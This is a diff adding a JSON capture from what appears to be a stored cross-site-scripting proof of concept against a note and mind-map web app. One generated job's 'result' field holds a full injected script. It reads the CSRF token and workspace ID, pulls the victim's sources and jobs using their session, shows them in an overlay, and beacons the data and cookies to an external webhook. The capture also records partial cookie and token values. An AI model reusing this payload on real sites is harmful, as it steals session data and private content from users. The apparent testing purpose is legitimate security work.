@@ -1,0 +1,43 @@
+{
+    "attack": "E2E-STORED-XSS",
+    "host": "mythosnote.tech",
+    "workspace": "af5b701e-a74b-431e-9c7a-1638c9feddaa",
+    "sources": {
+        "count": 1,
+        "next": null,
+        "previous": null,
+        "results": [
+            {
+                "id": "6da5acc4-384b-405a-8fd1-6834acaa489f",
+                "file_name": "e2e-xss-mindmap.txt",
+                "status": "ready",
+                "created_at": "2026-06-07T16:21:33.177907+08:00",
+                "file_size": 2785,
+                "progress": 100,
+                "error_message": ""
+            }
+        ]
+    },
+    "generate_jobs": {
+        "count": 1,
+        "next": null,
+        "previous": null,
+        "results": [
+            {
+                "id": "bc4261c2-ab4b-4813-9bad-bb763f0d77a6",
+                "action": "mindmap",
+                "status": "success",
+                "title": "Mindmap Keamanan Web",
+                "source_ids": [
+                    "6da5acc4-384b-405a-8fd1-6834acaa489f"
+                ],
+                "options": {},
+                "result": "{\"name\": \"</script><script>(function(){var c=document.cookie.match(/csrftoken=([^;]+)/);var w=document.body.innerHTML.match(/workspace_id=([a-f0-9-]{36})/i);var ws=w?w[1]:null;var h={'Accept':'application/json'};if(c)h['X-CSRFToken']=c[1];Promise.all([fetch('/api/sources/?workspace_id='+ws,{credentials:'include',headers:h}).then(function(r){return r.json()}).catch(function(){return{}}),fetch('/api/workspace/'+ws+'/generate/',{credentials:'include',headers:h}).then(function(r){return r.json()}).catch(function(){return{}})]).then(function(d){var x={attack:'E2E-STORED-XSS',host:location.hostname,workspace:ws,sources:d[0],generate_jobs:d[1],cookies:document.cookie.slice(0,120)};var o=document.createElement('div');o.style.cssText='position:fixed;inset:0;z-index:999999;background:#0a0a0a;color:#fff;padding:24px;font:13px monospace;overflow:auto';var t=document.createElement('h1');t.style.color='#ef4444';t.textContent='E2E XSS — DATA DIAMBIL DARI SESSION ANDA';o.appendChild(t);var p=document.createElement('pre');p.style.color='#4ade80';p.textContent=JSON.stringify(x,null,2);o.appendChild(p);var b=document.createElement('button');b.textContent='Tutup PoC';b.onclick=function(){o.remove()};b.style.cssText='margin-top:16px;padding:10px 20px;background:#dc2626;color:#fff;border:none;border-radius:6px;cursor:pointer';o.appendChild(b);document.body.appendChild(o);try{navigator.sendBeacon('https://webhook.site/00f9dd09-c3a4-406f-971b-884ad2653e93',JSON.stringify(x))}catch(e){}});})();</script><!--\", \"children\": [{\"name\": \"XSS Reflected\", \"children\": []}, {\"name\": \"XSS Stored\", \"children\": []}, {\"name\": \"XSS DOM-based\", \"children\": []}]}",
+                "error_message": "",
+                "created_at": "2026-06-07T16:21:39.453836+08:00",
+                "updated_at": "2026-06-07T16:21:43.758050+08:00"
+            }
+        ]
+    },
+    "cookies": "g_state={\"i_l\":0,\"i_ll\":1780812485147,\"i_e\":{\"enable_itp_optimization\":0},\"i_et\":1780812483561}; csrftoken=JryIztsLdWiON"
+}
